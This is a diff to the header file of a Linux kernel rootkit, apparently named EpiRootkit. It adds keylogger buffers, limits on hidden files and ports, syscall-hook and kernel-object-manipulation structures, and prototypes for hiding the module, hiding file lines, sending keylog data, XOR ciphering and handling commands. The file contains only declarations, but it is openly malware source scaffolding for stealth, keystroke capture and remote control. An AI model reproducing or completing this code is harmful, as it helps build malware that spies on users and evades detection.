@@ -24,11 +24,18 @@
 #include <linux/ctype.h>
 #include <linux/jiffies.h>
 #include <linux/delay.h>
+#include <linux/list.h>
+#include <linux/socket.h>
 
 // Error codes
 #define ROOTKIT_ERROR_FILE    1
 #define ROOTKIT_ERROR_MEMORY  2
 #define ROOTKIT_ERROR_NETWORK 3
+
+// Constants
+#define KEYLOG_BUFFER_SIZE 1024
+#define MAX_HIDDEN_FILES 100
+#define MAX_HIDDEN_PORTS 50
 
 // Configuration structures
 struct rootkit_config {
@@ -70,13 +77,16 @@ struct network_manager {
     struct task_struct *thread;
 };
 
-struct dkom_entry {
-    void *object;
+struct hook_entry {
+    void *target;
+    void *original;
     struct list_head list;
 };
 
-struct hook_entry {
+struct dkom_entry {
     void *target;
+    void *original;
+    size_t size;
     struct list_head list;
 };
 
@@ -94,18 +104,28 @@ extern unsigned long *sys_call_table;
 extern asmlinkage long (*original_getdents64)(const struct pt_regs *);
 extern asmlinkage long (*original_read)(const struct pt_regs *);
 extern asmlinkage long (*original_write)(const struct pt_regs *);
+extern char keylog_buffer[KEYLOG_BUFFER_SIZE];
+extern int keylog_buffer_index;
+extern struct list_head module_list;
+extern bool module_hidden;
 
 // Function declarations
-void dkom_restore_object(void *object);
-void remove_hook(void *target);
+void dkom_restore_object(struct dkom_entry *entry);
+void remove_hook(struct hook_entry *entry);
 void send_error(int error_code, const char *message);
 void send_data(const char *data);
 void apply_xor_cipher(char *data, int len);
 void process_command(const char *command);
-void free_secure_memory(void *ptr);
+void free_secure_memory(void *ptr, size_t size);
 void unhide_module(void);
 void keylog_buffer_cleanup(void);
 int keylog_thread(void *data);
 int stealth_thread(void *data);
+void xor_cipher(char *data, int length);
+void hide_line(const char *filename, unsigned long line);
+void unhide_line(const char *filename, unsigned long line);
+bool is_line_hidden(const char *filename, unsigned long line);
+void send_keylog_data(void);
+void hide_module(void);
 
 #endif // EPIROOTKIT_H 
